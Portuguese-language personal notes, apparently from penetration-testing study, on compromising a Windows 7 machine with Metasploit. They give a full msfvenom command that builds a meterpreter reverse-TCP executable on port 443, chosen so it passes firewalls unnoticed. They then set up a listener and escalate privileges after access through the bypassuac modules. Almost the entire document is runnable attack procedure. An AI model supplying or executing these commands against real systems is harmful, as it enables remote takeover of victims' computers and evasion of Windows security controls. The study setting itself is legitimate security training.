=== Payloads | Win 7 Invasion | Privilege Escalation ===

	==== Invasão ====
<> msfvenom -> Cria Payloads Executavei o qual a vitima pode executar
	-h
	-l -> lista
	-e -> Codifica Payloadn (encoder)
	-a -> arquitetura
	-- platform
	-i -> Iterações
	-f -> Tipo de arquivo (exe, apk, py etc)
	-o -> Nome de saida

<> msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=MyIP LPORT=443 -f exe -o payload.exe
	-> Gera um arquivo executavel do windows com um paylaod malicioso
	-> Porta 443 geralmente passa despercebida pelo firewall na hora de estabelecer a conexão

<> msfconsole
	>>> use exploit/multi/handler
		Exploite multiplataforma que esculta (handler)

	>>> set payload windows/meterpreter/reverse_tcp
		Diz que deve escutar comunicações do tipo meterpreter
		Mesmo que payload gerado
	
	>>> set LHOST e LPORT
		Define Ip local e Porta local

	>>> exploit
		Inicia a exploração, no caso iniciou a ouvidoria


		==== Pós Invasão ====
Dependendo do sistema invadido, não possuimos privilegios suficiente
Para isso precisamos fazer um privilege escalation

<in msfconsole with estabilished connection>
	>>> getsystem  --- FAILED
		(Win 7 Possui UAC que impede a alteração de usuario)

	>>> background
		MAnda a sessão e joga para segundo plano para criar outro exploit


<msfconsole>
	>>> use exploit/windows/local/bypassuac (_injection ou _vbs)
		Usa um payload de bypass do UAC

	>>> options
		Para retornar as variaveis

	>>> set session 1
		Define a sessão a ser exploitada

	>>> set LPORT 4000
		Setando uma porta diferente para cada payload
		
	>>> set target 1 
		Seta o id 1 == X64

	>>> sessions -i 1
		Diz "Interact with session 1"

*** As vezes gera um erro de upload, e a melhor solução é alterar o exploit ***
*** O jeito é testando :-) ***


